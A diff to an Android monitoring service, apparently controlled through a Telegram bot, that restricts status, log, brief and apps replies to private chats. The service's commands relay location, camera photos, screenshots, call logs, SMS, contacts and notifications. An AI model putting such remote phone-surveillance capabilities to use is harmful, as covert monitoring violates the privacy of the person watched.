@@ -4485,13 +4485,13 @@ class MonitoringService : Service() {
                     captureAndSendScreenshot()
                 }
             }
-            "/status" -> handleStatusCommand()
+            "/status" -> handleStatusCommand(privateChat)
             "/shotperm" -> requestShotGrant()
             "/perms" -> {
                 val notifOn = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
                 sendToTelegram(PermReport.inventoryText(permissionRawStates(), notifOn, permLabels))
             }
-            "/brief" -> handleRingkasCommand()
+            "/brief" -> handleRingkasCommand(privateChat)
             "/lastcalls" -> handleLastCallsCommand(privateChat)
             "/lastsms" -> handleLastSmsCommand(privateChat)
             "/photointerval" -> handlePhotoIntervalCommand(arg)
@@ -4527,7 +4527,7 @@ class MonitoringService : Service() {
             "/location" -> handleLocationCommand(privateChat)
             "/camera" -> handleCameraCommand(arg)
             "/notify" -> handleNotifCommand(arg)
-            "/log" -> handleLogCommand()
+            "/log" -> handleLogCommand(privateChat)
             "/syncinterval" -> handleSyncIntervalCommand(arg)
             "/restart" -> {
                 if (restartAllLoops()) {
@@ -4575,7 +4575,7 @@ class MonitoringService : Service() {
             "/datasaver" -> handleHematDataCommand(arg)
             "/heartbeat" -> handleHeartbeatCommand(arg)
             "/contacts" -> handleContactsCommand(arg, privateChat)
-            "/apps" -> handleAppsCommand(arg)
+            "/apps" -> handleAppsCommand(arg, privateChat)
             "/storage" -> handleStorageCommand()
             "/history" -> handleHistoryCommand(arg, privateChat)
             "/watch" -> handleWatchCommand(arg, privateChat)
@@ -5571,7 +5571,9 @@ class MonitoringService : Service() {
         return out
     }
 
-    private suspend fun handleAppsCommand(arg: String) {
+    private suspend fun handleAppsCommand(arg: String, privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+
         val tokens = arg.lowercase(java.util.Locale.ROOT).split(' ').filter { it.isNotEmpty() }
         val includeAll = tokens.any { it == "all" || it == "semua" }
         val parsed = tokens.firstOrNull { it.toIntOrNull() != null }?.toIntOrNull()
@@ -6486,7 +6488,9 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun handleLogCommand() {
+    private suspend fun handleLogCommand(privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+
         val crash = try {
             CrashReporter.pendingReport(this)
         } catch (_: Exception) {
@@ -6754,7 +6758,9 @@ class MonitoringService : Service() {
         captureAndSendPhoto(reportResult = true)
     }
 
-    private suspend fun handleStatusCommand() {
+    private suspend fun handleStatusCommand(privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+
         val lastSync = preferencesManager.lastSyncTime
         val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "belum pernah"
         val photoState = if (isPhotoPaused()) {
@@ -6816,7 +6822,9 @@ class MonitoringService : Service() {
         )
     }
 
-    private suspend fun handleRingkasCommand() {
+    private suspend fun handleRingkasCommand(privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+
         val level = batteryLevel()
         val notifOn = try { preferencesManager.notifForwardEnabled } catch (_: Exception) { false }
         val snap = try { preferencesManager.permSnapshot } catch (_: Exception) { -1 }
